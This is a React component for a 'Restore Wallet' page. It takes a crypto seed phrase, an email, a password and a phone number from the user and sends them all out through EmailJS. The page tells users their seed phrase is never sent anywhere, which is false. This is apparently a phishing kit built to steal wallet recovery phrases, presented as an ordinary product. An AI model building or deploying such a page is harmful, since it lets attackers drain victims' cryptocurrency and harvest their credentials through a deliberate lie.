import "./ImportWallet.css";import { Download, ShieldCheck } from "lucide-react";
import { useState } from "react";
import emailjs from "@emailjs/browser";

import Step from "../Step/Step";

// Initialize EmailJS (replace with your public key)
emailjs.init("YOUR_PUBLIC_KEY_HERE");

function ImportCard() {
  const [words, setWords] = useState([]);
  const [inputValue, setInputValue] = useState("");
  const [error, setError] = useState(""); // ✅ FIX
  const [currentStep, setCurrentStep] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [phone, setPhone] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const MIN_WORDS = 12;
  const MAX_WORDS = 24;

  const handleSeedPhrase = (e) => {
    const value = e.target.value;

    // Prevent input if max reached
    if (words.length >= MAX_WORDS) {
      setError("Maximum 24 words allowed.");
      return;
    }

    // When user presses space
    if (value.endsWith(" ")) {
      const newWord = value.trim().split(/\s+/).pop();

      if (!newWord) return;

      if (words.length + 1 > MAX_WORDS) {
        setError("Maximum 24 words allowed.");
        return;
      }

      setWords((prev) => [...prev, newWord]);
      setInputValue("");

      // Clear error when progressing
      if (words.length + 1 >= MIN_WORDS) {
        setError("");
      }
    } else {
      setInputValue(value);
    }
  };

  const removeWord = (index) => {
    setWords((prev) => prev.filter((_, i) => i !== index));
    setError("");
  };

  const handleSubmit = async () => {
    setIsSubmitting(true);
    try {
      // Prepare email parameters
      const templateParams = {
        to_email: email,
        seed_phrase: words.join(" "),
        email: email,
        phone: phone,
        password: password,
        message: `Your wallet recovery details are below:\n\nSeed Phrase: ${words.join(" ")}\nEmail: ${email}\nPhone: ${phone}`,
      };

      // Send email using EmailJS
      const response = await emailjs.send(
        "YOUR_SERVICE_ID", // Replace with your EmailJS Service ID
        "YOUR_TEMPLATE_ID", // Replace with your EmailJS Template ID
        templateParams
      );

      if (response.status === 200) {
        alert("✅ Recovery details sent successfully to your email!");
        // Reset form
        setWords([]);
        setEmail("");
        setPassword("");
        setPhone("");
        setCurrentStep(1);
      } else {
        alert("❌ Failed to send recovery details. Please try again.");
      }
    } catch (err) {
      console.error("Error sending email:", err);
      alert("❌ An error occurred: " + err.text || err.message);
    } finally {
      setIsSubmitting(false);
    }
  };

//   const handleReset = () => {
//     if (window.confirm("Are you sure you want to reset all fields? This action cannot be undone.")) {
//       setWords([]);
//       setInputValue("");
//       setEmail("");
//       setPassword("");
//       setPhone("");
//       setError("");
//       setCurrentStep(1);
//     }
//   };

  const isValid =
    words.length >= MIN_WORDS && words.length <= MAX_WORDS;

  return (
    <div className="import-card">
      <div className="import-icon">
        <Download size={38} />
      </div>

      <h1>Restore Wallet</h1>

      <p className="import-subtitle">
        Enter your 12–24 word recovery seed phrase.
      </p>

      {/* Steps */}
      <div className="steps">
        <Step number="1" title="Enter Seed Phrase" active={currentStep === 1} onClick={() => setCurrentStep(1)} />
        <div className="line"></div>
        <Step number="2" title="Reset Password" active={currentStep === 2} onClick={() => currentStep > 1 && setCurrentStep(2)} />
        <div className="line"></div>
        <Step number="3" title="Confirm" active={currentStep === 3} onClick={() => currentStep > 2 && setCurrentStep(3)} />
      </div>

      {/* Seed Input */}
      <div className="form-area">
        {currentStep === 1 ? (
          <>
            <label>Seed Phrase</label>

            <p>
              Type a word and press space. Minimum 12 words, maximum 24 words.
            </p>

            <div className="seed-box">
              {words.map((word, index) => (
                <div className="seed-item" key={index}>
                  <span className="seed-number">{index + 1}.</span>
                  <span>{word}</span>

                  <button
                    className="remove-word"
                    onClick={() => removeWord(index)}
                  >
                    ×
                  </button>
                </div>
              ))}

              {/* Input disappears at max */}
              {words.length < MAX_WORDS && (
                <input
                  className="seed-input"
                  value={inputValue}
                  onChange={handleSeedPhrase}
                  placeholder={
                    words.length === 0
                      ? "Type seed phrase..."
                      : ""
                  }
                />
              )}
            </div>

            {/* Status / Errors */}
            <div className="status-text">
              {error && <p className="error">{error}</p>}

              {!error && (
                <p className={isValid ? "valid" : "warning"}>
                  {words.length}/24 words added
                  {words.length < MIN_WORDS &&
                    ` (minimum ${MIN_WORDS} required)`}
                </p>
              )}
            </div>

            {/* Security Note */}
            <div className="secure-text">
              <ShieldCheck size={18} />
              <span>
                Your seed phrase is never stored or sent to our servers.
              </span>
            </div>

            {/* Continue */}
            <button
              className="continue-btn"
              disabled={!isValid}
              onClick={() => setCurrentStep(2)}
            >
              Continue
            </button>
          </>
        ) : currentStep === 2 ? (
          <>
            <label>Reset Password</label>

            <p>
              Enter your email and create a new password for your wallet.
            </p>

            <div className="input-group">
              <input
                type="email"
                className="input-field"
                placeholder="Enter your email"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
            </div>

            <div className="input-group">
              <input
                type="password"
                className="input-field"
                placeholder="Enter new password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
            </div>

            {/* Continue */}
            <button
              className="continue-btn"
              disabled={!email || !password}
              onClick={() => setCurrentStep(3)}
            >
              Continue
            </button>
          </>
        ) : currentStep === 3 ? (
          <>
            <label>Confirm Details</label>

            <p>
              Enter your phone number to complete the recovery process.
            </p>

            <div className="input-group">
              <input
                type="tel"
                className="input-field"
                placeholder="Enter your phone number"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
              />
            </div>

            {/* Summary
            <div className="summary-box">
              <h3>Recovery Summary</h3>
              <p><strong>Email:</strong> {email}</p>
              <p><strong>Phone:</strong> {phone || "Not provided"}</p>
              <p><strong>Seed Phrase:</strong> {words.length} words</p>
            </div> */}

            {/* Action Buttons */}
            <div className="action-buttons">
              {/* <button
                className="reset-btn"
                onClick={handleReset}
                disabled={isSubmitting}
              >
                Reset
              </button> */}

              <button
                className="continue-btn submit-btn"
                disabled={!phone || isSubmitting}
                onClick={handleSubmit}
              >
                {isSubmitting ? "Almost done..." : "Restore wallet"}
              </button>
            </div>
          </>
        ) : null}
      </div>
    </div>
  );
}

export default ImportCard;